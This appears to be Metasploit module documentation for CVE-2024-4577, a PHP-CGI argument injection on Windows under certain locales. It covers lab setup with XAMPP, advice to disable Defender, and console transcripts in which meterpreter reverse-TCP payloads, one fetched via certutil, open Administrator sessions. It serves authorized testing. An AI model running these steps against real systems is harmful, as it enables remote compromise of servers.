## Vulnerable Application
This module exploits a PHP CGI argument injection vulnerability affecting PHP in certain configurations
on a Windows target. A vulnerable configuration is locale dependant (such as Chinese or Japanese), such that
the Unicode best-fit conversion scheme will unexpectedly convert a soft hyphen (0xAD) into a dash (0x2D)
character. Additionally a target web server must be configured to run PHP under CGI mode, or directly expose
the PHP binary. This issue has been fixed in PHP 8.3.8 (for the 8.3.x branch), 8.2.20 (for the 8.2.x branch),
and 8.1.29 (for the 8.1.x branch). PHP 8.0.x and below are end of life and have note received patches.

XAMPP is vulnerable in a default configuration, and we can target the /php-cgi/php-cgi.exe endpoint. To target
an explicit .php endpoint (e.g. /index.php), the server must be configured to run PHP scripts in CGI mode.

## Testing
* Configure a Windows system with a system locale for Japanese (code page 932).
  * Navigate to `Control Panel` -> `Region` -> `Administrative` -> `Change system locale...`
  * Select `Japanese (Japan)` and click `OK`.
  * Click `Restart now`.
  * After restart, login and open a command prompt. Verify the code page via the command `chcp`. You should see this:
```
Microsoft Windows [Version 10.0.20348.1607]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator>chcp
Active code page: 932
```
* Download a known vulnerable version of XAMPP `8.2.12 / PHP 8.2.12`
([direct link here](https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/8.2.12/xampp-windows-x64-8.2.12-0-VS16-installer.exe)).
* Install XAMPP and run the XAMPP Console. Click the `Start` action to start the Apache web server.
* Verify you can browse to http://127.0.0.1:80/. You should see the "Welcome to XAMPP for Windows" page.

No further configuration is needed to exploit the target when targeting the exploits default `TARGETURI` endpoint
`/php-cgi/php-cgi.exe'`. This is because XAMPP uses the Apache `ScriptAlias` directive to expose the `php-cgi.exe`
binary directly. If you want to target an `.php` endpoint (for example `/index.php`), the target Apache serer must
have this enabled in its configuration (`c:\xampp\apache\conf\extra\httpd-xampp.conf`):

```
 #
 # PHP-CGI setup
 #
 <FilesMatch "\.php$">
     SetHandler application/x-httpd-php-cgi
 </FilesMatch>
 <IfModule actions_module>
     Action application/x-httpd-php-cgi "/php-cgi/php-cgi.exe"
 </IfModule>
```

If you modify the Apache config, dont forget to restart the Apache server to pick up the changes.

## Verification Steps
Note: On Windows, disable Defender if you are using the command payloads. This is not needed for the PHP payloads
as they execute in-memory.

1. Start msfconsole
2. `use exploit/windows/http/php_cgi_arg_injection_rce_cve_2024_4577`
3. `set RHOST <TARGET_IP_ADDRESS>`
4. `set target 0`
5. `set payload php/meterpreter/reverse_tcp`
6. `set LHOST eth0`
7. `check`
8. `exploit`

## Scenarios

### Windows PHP

```
msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > set RHOSTS 192.168.86.50
RHOSTS => 192.168.86.50
msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > check
[+] 192.168.86.50:80 - The target is vulnerable. Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > set target 0
target => 0
msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > set LHOST eth0
LHOST => eth0
msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > show options

Module options (exploit/windows/http/php_cgi_arg_injection_rce_cve_2024_4577):

   Name       Current Setting       Required  Description
   ----       ---------------       --------  -----------
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.86.50         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80                    yes       The target port (TCP)
   SSL        false                 no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /php-cgi/php-cgi.exe  yes       The path to a PHP CGI endpoint
   VHOST                            no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  eth0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows PHP



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > check
[+] 192.168.86.50:80 - The target is vulnerable. Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > exploit

[*] Started reverse TCP handler on 192.168.86.42:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
[*] Sending stage (39927 bytes) to 192.168.86.50
[*] Meterpreter session 1 opened (192.168.86.42:4444 -> 192.168.86.50:49761) at 2024-06-10 17:32:52 +0100

meterpreter > getuid
Server username: Administrator
meterpreter > pwd
C:\xampp\php
meterpreter > sysinfo
Computer    : WIN-V28QNSO2H05
OS          : Windows NT WIN-V28QNSO2H05 10.0 build 20348 (Windows Server 2022) AMD64
Meterpreter : php/windows
meterpreter > 
```

### Windows Command

```
msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > set target 1
target => 1
msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > set payload cmd/windows/http/x64/meterpreter/reverse_tcp
payload => cmd/windows/http/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > show options

Module options (exploit/windows/http/php_cgi_arg_injection_rce_cve_2024_4577):

   Name       Current Setting       Required  Description
   ----       ---------------       --------  -----------
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.86.50         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80                    yes       The target port (TCP)
   SSL        false                 no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /php-cgi/php-cgi.exe  yes       The path to a PHP CGI endpoint
   VHOST                            no        HTTP server virtual host


Payload options (cmd/windows/http/x64/meterpreter/reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   EXITFUNC            process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   FETCH_COMMAND       CERTUTIL         yes       Command to fetch payload (Accepted: CURL, TFTP, CERTUTIL)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      ZyJgsNjYvpTX     no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  %TEMP%           yes       Remote writable dir to store payload; cannot contain spaces.
   LHOST               eth0             yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows Command



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > check
[+] 192.168.86.50:80 - The target is vulnerable. Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
msf6 exploit(windows/http/php_cgi_arg_injection_rce_cve_2024_4577) > exploit

[*] Started reverse TCP handler on 192.168.86.42:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
[*] Sending stage (201798 bytes) to 192.168.86.50
[*] Meterpreter session 2 opened (192.168.86.42:4444 -> 192.168.86.50:49780) at 2024-06-10 17:34:45 +0100

meterpreter > getuid
Server username: WIN-V28QNSO2H05\Administrator
meterpreter > pwd
C:\xampp\php
meterpreter > sysinfo
Computer        : WIN-V28QNSO2H05
OS              : Windows Server 2022 (10.0 Build 20348).
Architecture    : x64
System Language : ja_JP
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > 
```
